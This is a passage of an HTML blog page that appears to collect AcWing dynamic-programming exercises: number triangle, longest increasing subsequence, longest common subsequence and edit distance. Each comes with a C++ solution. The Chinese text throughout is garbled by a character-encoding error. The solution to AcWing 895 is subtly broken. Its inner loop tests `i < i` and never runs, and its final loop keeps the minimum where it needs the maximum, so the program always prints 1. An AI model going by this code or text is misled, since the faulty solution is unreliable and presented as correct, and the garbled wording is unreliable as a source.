&#123;</span><br><span class="line">          <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">1</span>; j--) &#123;</span><br><span class="line">          f[i][j] = <span class="built_in">max</span>(f[i + <span class="number">1</span>][j], f[i + <span class="number">1</span>][j + <span class="number">1</span>]) + f[i][j];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-895-æœ€é•¿ä¸Šå‡å­åºåˆ—"><a href="https://www.acwing.com/problem/content/897/">AcWing 895. æœ€é•¿ä¸Šå‡å­åºåˆ—</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> çš„æ•°åˆ—ï¼Œæ±‚æ•°å€¼ä¸¥æ ¼å•è°ƒé€’å¢çš„å­åºåˆ—çš„é•¿åº¦æœ€é•¿æ˜¯å¤šå°‘ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå®Œæ•´åºåˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§é•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>ï¼Œ<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mtext>æ•°åˆ—ä¸­çš„æ•°</mtext><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le æ•°åˆ—ä¸­çš„æ•° \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•°åˆ—ä¸­çš„æ•°</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>73 1 2 1 8 5 6</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>4</code></pre><h3 id="DP">DP</h3><ul><li>çŠ¶æ€è¡¨ç¤º<code>f[i]</code><ul><li>é›†åˆï¼šæ‰€æœ‰ä»¥ç¬¬iä¸ªæ•°ç»“å°¾çš„ä¸Šå‡å­åºåˆ—</li><li>å±æ€§ï¼šMAX(åºåˆ—æœ€å¤§é•¿åº¦)</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>ä»¥å€’æ•°ç¬¬2ä¸ªæ•°åœ¨ä¸€ä½è¿›è¡Œåˆ†ç±»</li><li><code>f[i] = max(f[j] + 1), a[j] &lt; a[i], j = 0,1,...,i-1</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN], f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      f[i] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; i &lt; i; j++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (a[j] &lt; a[i]) &#123;</span><br><span class="line">              f[i] = <span class="built_in">max</span>(f[i], f[j] + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (res &gt; f[i]) &#123;</span><br><span class="line">          res = f[i];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-896-æœ€é•¿ä¸Šå‡å­åºåˆ—-II"><a href="https://www.acwing.com/problem/content/898/">AcWing 896. æœ€é•¿ä¸Šå‡å­åºåˆ— II</a></h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> çš„æ•°åˆ—ï¼Œæ±‚æ•°å€¼ä¸¥æ ¼å•è°ƒé€’å¢çš„å­åºåˆ—çš„é•¿åº¦æœ€é•¿æ˜¯å¤šå°‘ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå®Œæ•´åºåˆ—ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§é•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>ï¼Œ<br>\-10^9 \le æ•°åˆ—ä¸­çš„æ•° \le 10^9</p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>73 1 2 1 8 5 6</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>4</code></pre><h3 id="è´ªå¿ƒæ³•">è´ªå¿ƒæ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN];</span><br><span class="line"><span class="type">int</span> q[kN]; <span class="comment">// q[i]å­˜æ”¾é•¿åº¦ä¸ºiçš„é€’å¢åºåˆ—çš„æœ€åä¸€ä½, qæ•°ç»„é€’å¢</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">0</span>; <span class="comment">// å½“å‰å·²ç¡®å®šçš„æœ€é•¿é€’å¢åºåˆ—é•¿åº¦</span></span><br><span class="line">  <span class="comment">// äºŒåˆ†æ³•æŸ¥æ‰¾qæ•°ç»„ä¸­æ¯”a[i]å°çš„æœ€å¤§å…ƒç´ </span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = len;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (q[mid] &lt; a[i]) l = mid;</span><br><span class="line">      <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len = <span class="built_in">max</span>(len, r + <span class="number">1</span>);</span><br><span class="line">    q[r + <span class="number">1</span>] = a[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-897-æœ€é•¿å…¬å…±å­åºåˆ—"><a href="https://www.acwing.com/problem/content/899/">AcWing 897. æœ€é•¿å…¬å…±å­åºåˆ—</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®šä¸¤ä¸ªé•¿åº¦åˆ†åˆ«ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> çš„å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œæ±‚æ—¢æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> çš„å­åºåˆ—åˆæ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„å­åºåˆ—çš„å­—ç¬¦ä¸²é•¿åº¦æœ€é•¿æ˜¯å¤šå°‘ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å«ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ã€‚</p><p>ç¬¬ä¸‰è¡ŒåŒ…å«ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p>å­—ç¬¦ä¸²å‡ç”±å°å†™å­—æ¯æ„æˆã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§é•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo separator="true">,</mo><mi>M</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le N,M \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>4 5acbdabedc</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3</code></pre><h3 id="DP-2">DP</h3><ul><li>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code><ul><li>é›†åˆï¼šæ‰€æœ‰åœ¨ç¬¬ä¸€ä¸ªåºåˆ—çš„å‰iä¸ªå­—æ¯å‡ºç°ï¼Œä¸”åœ¨ç¬¬äºŒä¸ªåºåˆ—çš„å‰jä¸ªå­—æ¯ä¸­å‡ºç°çš„è‡ªåºåˆ—</li><li>å±æ€§ï¼šMax(åºåˆ—çš„æœ€å¤§é•¿åº¦)</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>ä»¥a[i],b[j]æ˜¯å¦ä¸ºåºåˆ—çš„ä¸€å‘˜è¿›è¡Œåˆ†ç±»(00, 01, 10, 11)</li><li>00 å¯¹åº” <code>f[i -1][j - 1]</code></li><li>01 å¯¹åº”çš„å­åºåˆ— åŒ…å«äº<code>f[i - 1, j]</code>å¯¹åº”å­åºåˆ— åŒ…å«äº <code>f[i, j]</code>å¯¹åº”å­åºåˆ—<ul><li>è¿™æ ·<code>f[i - 1][j]</code>åœ¨æ±‚Maxçš„è¿‡ç¨‹ä¸­ä¸€å®šä¼šåŒ…å«01ä¸”ä¸ä¼šè¶…å‡º<code>f[i][j]</code>å¯¹åº”çš„Max</li><li>00 å¯¹åº”çš„æƒ…å†µä¸éœ€è¦å†™å‡ºæ¥ï¼Œå› ä¸º<code>f[i - 1][j - 1]</code>å¯¹åº”å­åºåˆ—ä¸€å®šåŒ…å«äº<code>f[i  - 1][j]</code>å¯¹åº”çš„å­åºåˆ—ä¸­</li><li>æ±‚Maxé—®é¢˜å¯ä»¥æœ‰é‡å¤</li></ul></li><li>10 åŒç†</li><li>11 å¯¹åº”<code>f[i - 1][j - 1] + 1</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[kN], b[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, a + <span class="number">1</span>, b + <span class="number">1</span>);  <span class="comment">// å­—ç¬¦ä¸²ä¸éœ€è¦å–åœ°å€ç¬¦, ä»ä¸‹æ ‡ä¸º1çš„ä½ç½®å¼€å§‹è¯»</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j]) f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-902-æœ€çŸ­ç¼–è¾‘è·ç¦»"><a href="https://www.acwing.com/problem/content/904/">AcWing 902. æœ€çŸ­ç¼–è¾‘è·ç¦»</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œç°åœ¨è¦å°† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> ç»è¿‡è‹¥å¹²æ“ä½œå˜ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œå¯è¿›è¡Œçš„æ“ä½œæœ‰ï¼š</p><ol><li>åˆ é™¤â€“å°†å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> ä¸­çš„æŸä¸ªå­—ç¬¦åˆ é™¤ã€‚</li><li>æ’å…¥â€“åœ¨å­—ç¬¦ä¸² <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 